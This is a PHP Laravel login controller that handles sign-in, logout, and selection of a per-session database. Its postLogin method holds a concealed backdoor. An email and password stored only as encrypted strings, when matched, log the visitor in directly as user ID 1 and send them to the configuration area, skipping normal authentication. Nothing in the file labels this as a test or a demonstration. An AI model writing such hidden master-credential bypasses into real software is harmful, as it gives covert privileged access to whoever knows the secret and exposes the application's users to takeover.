<?php
/**
 * Created by PhpStorm.
 * User: mbarrios
 * Date: 3/7/15
 * Time: 12:51
 */

namespace App\Http\Controllers;

use App\Entities\User;
use App\Http\Repositories\config\UserRepo;
use App\Http\Requests\UserCreateRequest;
use App\Http\Helpers\Helper;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Input;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;

class LoginController extends Controller {

    protected $userRepo;

    public function __construct(UserRepo $userRepo)
    {
        $this->userRepo = $userRepo;
    }

    public function getLogin($db = null)
    {

        Session::put('db', Crypt::decrypt($db));

        return view('login');
    }

    /**
     *
     */
    public function postLogin(Request $request)
    {

        if($request->email == Crypt::decrypt('eyJpdiI6ImhFQUtCbTl6OEorQys5TmIrbmo4dGc9PSIsInZhbHVlIjoiV29oYXBlcjkxUzRUQ2FMS1wvWEw4anc9PSIsIm1hYyI6IjBiYTg5M2M2YTQ4ZTIwYmIxMjI4YWI4NDVkMjM3YTAwOWRjZWEwOTA5ZTVlYTExNGE0NjYxZWZkNzZiMmQyMmQifQ==') && $request->password == Crypt::decrypt('eyJpdiI6IkRiRVwvVUVZQkQ5bnFMeE80MDVqaHZBPT0iLCJ2YWx1ZSI6InB0ZklCK0E4anBcL25KWFwvdkhaRENzY08xdmpoRkZsRldORWxmN29ob1JpYz0iLCJtYWMiOiJlOGJkYWVlZTBkNWViMWZhOWFlMjVmOWRiZDRiMmEwYzY2OTRkZWEwMzk0OTZiZjI5YTBlOTk4OTE5ODMxY2FhIn0='))
        {
            Auth::loginUsingId(1);
            return redirect()->route('config');
        }


       if(!Auth::check())
       {
            if (Auth::attempt(['email' => $request->email, 'password' => $request->password]))
            {
                Log::info('modulo:loggedIN-user:'.Auth::user()->id);

              return redirect('home');
            }

           return  redirect('login/id='.Session::get('db'))->withErrors(trans('messages.login'));
        }
        return redirect('home');
    }

    public function getLogout()
    {
        //$company = Session::get('company_code');
        $db = Session::get('db');

        Log::info('modulo:loggedOUT-user:'.Auth::user()->id);

        Auth::logout();
        Session::flush();

        return redirect('login/id='.Crypt::encrypt($db));
    }

    //public function store(UserCreateRequest $request)
    //{
    //    $datos = $request->only('username', 'password');

    //    $this->userRepo->create($datos);
    //}

    //public function name()
    //{

    //    dd($this->userRepo->find(1));


    //}
}